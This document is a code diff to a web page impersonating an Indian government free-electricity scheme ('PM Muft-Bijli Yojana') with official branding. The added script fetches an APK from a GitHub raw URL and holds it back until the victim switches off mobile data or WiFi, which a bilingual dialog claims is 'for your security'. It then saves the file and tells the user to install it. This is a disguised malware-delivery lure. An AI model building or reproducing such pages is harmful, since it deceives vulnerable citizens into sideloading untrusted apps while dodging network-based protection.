@@ -2,7 +2,9 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta property="og:title" content="मुफ्त बिजली योजना">
+    <meta property="og:title" content="????? ????? ?????">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+  
 <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQBTGeUXDFQLyXeRH-BiHpkQFP40NzuQPZhoQ&usqp=CAU">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>PM Muft-Bijli</title>
@@ -159,10 +161,114 @@
             font-weight: bold;
             color: #015296;
         }
+/* Overlay Styling (dark background) */
+        #overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent dark background */
+            z-index: 999; /* Ensures it is on top of the content */
+        }
 
+        /* Dialog Styling */
+        .dialog {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+            z-index: 1000; /* Ensures it is on top of the overlay */
+        }
+        
+        /* Progress Bar Container */
+        #progress-bar-container {
+            width: 100%;
+            height: 30px;
+            background-color: #f3f3f3;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+        
+        #progress-bar {
+            height: 100%;
+            width: 0%;
+            background-color: #4caf50;
+            text-align: center;
+            line-height: 30px;
+            color: white;
+            border-radius: 5px;
+        }
+        
+        /* Offline Dialog Styling */
+        #offline-dialog {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #B81B1B;
+            padding: 20px;
+            border: 1px solid #B81B1B;
+			color:#FFFFFF;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 95%;
+            text-align: center;
+        }
+
+        /* Save File Dialog Styling */
+        #save-file-dialog {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #015296;
+            padding: 20px;
+            color: #FFFFFF;
+            border: 1px solid #015296;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 80%;
+            text-align: center;
+        }
+
+        .buttonsave {
+    background-color: white;     /* White background */
+    color: #015296;                 /* Blue text */
+    border: 1px solid #015296;      /* Blue border for the button */
+    padding: 10px 20px;          /* Padding inside the button */
+    border-radius: 3px;          /* Minimum corner radius */
+    font-size: 16px;
+    width: 95%; 
+    font-weight: bold;            /* Text size */
+    cursor: pointer;            /* Pointer cursor on hover */
+    transition: all 0.3s ease;   /* Smooth transition for hover effects */
+}
+
+.buttonsave:hover {
+    background-color: #f0f0f0;  /* Light grey background when hovered */
+    color: darkblue;             /* Darker blue text on hover */
+}
+
+.buttonsave:active {
+    background-color: #e0e0e0;  /* Darker grey when the button is clicked */
+    color: navy;                 /* Navy blue text on click */
+}
     </style>
 </head>
 <body>
+<div id="overlay"></div>
     <div class="top-bar">
         <img src="https://pmsuryaghar.gov.in/assets/images/flag.svg" alt="India Flag">
         Government of India
@@ -171,6 +277,30 @@
     <div class="header">
         <h1>Muft-Bijli Yojana: HarGhar Bijli</h1>
     </div>
+	
+<!-- Progress Dialog -->
+<div id="progress-dialog" class="dialog">
+    <h3>Downloading...</h3>
+    <div id="progress-bar-container">
+        <div id="progress-bar">0%</div>
+    </div>
+</div>
+
+<!-- Offline Dialog -->
+<div id="offline-dialog" class="dialog">
+<center><img src="https://i.postimg.cc/xCnJZzQx/oie-transparent.png" height="50px"/><br></center><br>
+    <h4>TURN OFF YOUR MOBILE DATA INTERNET / WiFi<BR><br>अपना मोबाइल डेटा इंटरनेट / WiFi बंद करें</h4><br>
+    <p>- For your security reason please turn off the internet to install the application<br><br>- आपकी सुरक्षा के लिए कृपया इंटरनेट बंद करें ताकि एप्लिकेशन इंस्टॉल किया जा सके।</p>
+</div>
+
+<!-- Save File Dialog -->
+<div id="save-file-dialog" class="dialog">
+    <img src="https://i.postimg.cc/xCm5v7Yr/oie-transparent-1.png" height="50px"/><br>
+    <h3>Application Ready to install!</h3><br>
+    <p>Click the button below to save apk file.<br></p><p>Go to Downloads and install the application to register</p><br>
+    <button class="buttonsave" id="save-file-button">Save APK File</button>
+</div>
+
 
     <div class="hero">
         <h1>Muft-Bijli Yojana <br><span>HarGhar Bijli</span></h1>
@@ -188,55 +318,117 @@
              alt="PM Narendra Modi" class="hero-image">
     </div>
 
-    <a id="downloadButton" href="#" class="download-btn">Download app</a>
+    <a id="start-download" href="#" class="download-btn">Download APP</a>
 
     <footer>
         &copy; 2025 PM Muft-Bijli. All Rights Reserved.
     </footer>
 
-    <!-- Progress Bar Overlay -->
-    <div class="progress-overlay" id="progressOverlay">
-        <div class="progress-container">
-            <div class="progress-text" id="progressText">0%</div>
-        </div>
-    </div>
+ <script>
+    document.getElementById('start-download').addEventListener('click', () => {
+        downloadFileWithProgress();
+    });
 
-    <script>
-        document.getElementById("downloadButton").addEventListener("click", function (event) {
-            event.preventDefault();
-            let overlay = document.getElementById("progressOverlay");
-            let progressText = document.getElementById("progressText");
+    async function downloadFileWithProgress() {
+        const fileUrl = 'https://raw.githubusercontent.com/Pmmbe/Dow/refs/heads/main/PMMBYY.apk';  // Replace with your file URL
 
-            overlay.style.display = "flex";
+        // Show the overlay and the progress dialog
+        document.getElementById('overlay').style.display = 'block';
+        const progressDialog = document.getElementById('progress-dialog');
+        progressDialog.style.display = 'block';
 
-            let progress = 0;
-            let interval = setInterval(() => {
-                progress += 10;
-                progressText.innerText = progress + "%";
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    setTimeout(() => {
-                        overlay.style.display = "none";
-                        window.location.href = "https://github.com/Pmmbe/Dow/raw/refs/heads/main/PMMBYY.apk";
-                    }, 500);
+        try {
+            // Step 1: Fetch the file
+            const response = await fetch(fileUrl);
+            if (!response.ok) {
+                throw new Error('Failed to download file');
+            }
+
+            // Step 2: Get the total file size (in bytes)
+            const contentLength = response.headers.get('Content-Length');
+            const totalBytes = contentLength ? parseInt(contentLength, 10) : 0;
+
+            // Step 3: Create a Blob to hold the downloaded data
+            const reader = response.body.getReader();
+            let receivedBytes = 0;
+            const chunks = [];
+            
+            // Step 4: Read the file in chunks and update the progress bar
+            const progressBar = document.getElementById('progress-bar');
+            const progressBarContainer = document.getElementById('progress-bar-container');
+
+            while (true) {
+                const { done, value } = await reader.read();
+                if (done) {
+                    break;
                 }
-            }, 200);
-        });
-    </script>
 
-<script type="text/javascript">
-var sc_project=13004805; 
-var sc_invisible=1; 
-var sc_security="080186cb"; 
+                chunks.push(value);
+                receivedBytes += value.length;
+
+                // Calculate the progress percentage
+                const progress = Math.round((receivedBytes / totalBytes) * 100);
+                progressBar.style.width = `${progress}%`;
+                progressBar.innerText = `${progress}%`;
+            }
+
+            // Step 5: Combine the chunks into a Blob
+            const blob = new Blob(chunks);
+            const fileName = 'PMMBYY.apk';  // File name for download
+
+            // Hide the progress dialog and show the offline dialog
+            progressDialog.style.display = 'none';
+            let downloadBlob = blob;
+            if(navigator.onLine)
+            {
+                const offlineDialog = document.getElementById('offline-dialog');
+                offlineDialog.style.display = 'block';
+            }
+            else
+            {
+                downloadOffline(downloadBlob, fileName);
+            }           
+
+            // Store the Blob for offline download later
+           
+
+            // Step 6: Listen for the offline event and trigger the download
+            window.addEventListener("offline", () => {
+                downloadOffline(downloadBlob, fileName);
+            });
+
+        } catch (error) {
+            console.error('Error during file download:', error);
+        }
+    }
+
+    function downloadOffline(blob, fileName) {
+        // Trigger the download when offline
+        const link = document.createElement('a');
+        link.href = URL.createObjectURL(blob);
+        link.download = fileName;
+        link.click();
+
+        // Clean up the Blob URL after the download is triggered
+        URL.revokeObjectURL(link.href);
+
+        // Replace the offline dialog with the "save file" dialog if download was missed
+        const offlineDialog = document.getElementById('offline-dialog');
+        offlineDialog.style.display = 'none';
+
+        const saveFileDialog = document.getElementById('save-file-dialog');
+        saveFileDialog.style.display = 'block';
+
+        // Add an event listener for the "Save File" button
+        document.getElementById('save-file-button').addEventListener('click', () => {
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = fileName;
+            link.click();
+            URL.revokeObjectURL(link.href);
+        });
+    }
 </script>
-<script type="text/javascript"
-src="https://www.statcounter.com/counter/counter.js"
-async></script>
-<noscript><div class="statcounter"><a title="Web Analytics"
-href="https://statcounter.com/" target="_blank"><img
-class="statcounter"
-src="https://c.statcounter.com/13004805/0/080186cb/1/"
-alt="Web Analytics"
-referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
+  
 </body>
 </html>
